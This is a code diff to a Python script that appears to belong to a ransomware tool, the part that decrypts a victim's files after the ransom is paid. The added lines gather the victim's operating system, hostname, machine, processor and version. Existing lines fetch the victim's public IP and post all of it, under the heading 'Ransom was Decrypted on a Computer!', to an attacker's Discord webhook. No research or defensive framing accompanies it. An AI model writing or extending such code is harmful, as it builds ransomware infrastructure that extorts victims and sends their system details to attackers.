@@ -14,6 +14,7 @@ import time
 import requests
 from requests import get
 import datetime
+import platform
 os.system("clear") 
 files=[]
 
@@ -41,17 +42,32 @@ if user == "hello": ### change this password.
                 continue
          ### Webhook to Discord
             print("Task Sucessful, All files were Decrypted")
+            oss=('Operating System : ', platform.system())
+            hs=('Hostname : ', platform.node())
+            ms=("Machine : ", platform.machine())
+            pro=("Processor : ", platform.processor())
+            rel=("Release : ", platform.release())
+            vr=("Version : ", platform.version())
             ip=get("https://api.ipify.org").text
             dt = datetime.datetime.now()
             nowt=dt.strftime("%Y-%m-%d %H:%M:%S")
             url = "" ### Your Discord Webhook Goes here, inside the Quotes.
             
-            x = f"""```
-Ransom was Decrypted on a Computer!
+            x = f"""**```
+Ransom was Decrypted on a Computer! 
 ------------------------------------
 Target IP Address ~> {ip} 
-------------------------------------
-Time ~> {nowt}``` """
+---------------------------------
+Time ~> {nowt}
+---------------------
+Hardware Information:
+
+{oss}
+{hs}
+{ms}
+{pro}
+{rel}
+{vr}```**"""
             r=requests.post(url, data={"content": x})
 
             input("ENTER to quit")
